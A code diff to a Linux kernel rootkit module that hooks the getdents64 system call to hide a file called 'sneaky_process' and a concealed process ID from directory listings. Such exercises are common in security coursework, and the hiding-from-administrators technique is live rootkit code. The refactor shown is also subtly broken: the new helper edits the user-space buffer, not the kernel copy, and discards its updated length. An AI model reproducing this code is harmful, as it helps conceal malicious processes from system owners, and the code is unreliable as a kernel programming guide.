@@ -76,10 +76,25 @@ void remove_directory_entry(struct linux_dirent64 *entry, int nreads, int bpos) 
   memmove(dest, src, move_size);
 }
 
+void remove_directory_entries_with_name(struct linux_dirent64 *dirp, int nreads, const char *target_name) {
+  int bpos = 0;
+
+  while (bpos < nreads) {
+    struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
+
+    if (strcmp(d->d_name, target_name) == 0) {
+      remove_directory_entry(d, nreads, bpos);
+      nreads -= d->d_reclen;
+    } else {
+      bpos += d->d_reclen;
+    }
+  }
+}
+
 asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
   struct linux_dirent64 * dirp;
-  struct linux_dirent64 * d;
-  int bpos;
+  // struct linux_dirent64 * d;
+  // int bpos;
   unsigned int count;
   char * buffer;
   int nreads = original_getdents64(regs);
@@ -96,17 +111,20 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
   
   copy_from_user((void *) buffer, (void *) dirp, count);
 
-  for (bpos=0; bpos < nreads;) {
-    d = (struct linux_dirent64 *) (buffer + bpos);
-    // printk(KERN_INFO "Sneaky %p %llu %s %4d\n", d, d->d_ino, d->d_name, d->d_reclen);
-    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
-      // memmove((void *) d, (void *) (((char *) d) + d->d_reclen), nreads - bpos - d->d_reclen);
-      remove_directory_entry(d, nreads, bpos);
-      nreads -= d->d_reclen;
-    } else {
-      bpos += d->d_reclen;
-    }
-  }
+  remove_directory_entries_with_name(dirp, nreads, "sneaky_process");
+  remove_directory_entries_with_name(dirp, nreads, sneaky_pid);
+
+  // for (bpos=0; bpos < nreads;) {
+  //   d = (struct linux_dirent64 *) (buffer + bpos);
+  //   // printk(KERN_INFO "Sneaky %p %llu %s %4d\n", d, d->d_ino, d->d_name, d->d_reclen);
+  //   if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
+  //     // memmove((void *) d, (void *) (((char *) d) + d->d_reclen), nreads - bpos - d->d_reclen);
+  //     remove_directory_entry(d, nreads, bpos);
+  //     nreads -= d->d_reclen;
+  //   } else {
+  //     bpos += d->d_reclen;
+  //   }
+  // }
 
   copy_to_user((void *) dirp, (void *) buffer, count);
 
